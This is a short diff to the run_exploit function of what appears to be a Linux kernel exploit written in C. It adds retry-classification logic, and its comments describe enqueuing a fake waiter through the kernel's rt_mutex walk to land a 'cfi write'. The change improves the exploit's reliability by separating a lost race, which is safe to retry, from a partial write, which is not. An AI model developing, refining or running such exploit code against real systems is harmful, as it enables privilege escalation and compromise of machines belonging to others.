@@ -667,5 +667,17 @@ int run_exploit(int argc, char **argv) {
                keeper);
   }
 #endif
-  return exploit_ok ? 0 : 1;
+  /* v44-retry-fix */
+  if (exploit_ok) {
+    return 0;
+  }
+  /* Distinguish race-lost (nothing written, safe to retry) from
+   * write-landed-then-failed (unsafe to retry).  cfi_dirty_seen
+   * is set only after a successful cfi write, which requires the
+   * kernel's rt_mutex walk to have actually enqueued the fake
+   * waiter and produced the write-through. */
+  if (atomic_load(&cfi_stage_done) || cfi_dirty_seen) {
+    return 1;
+  }
+  return 2;
 }
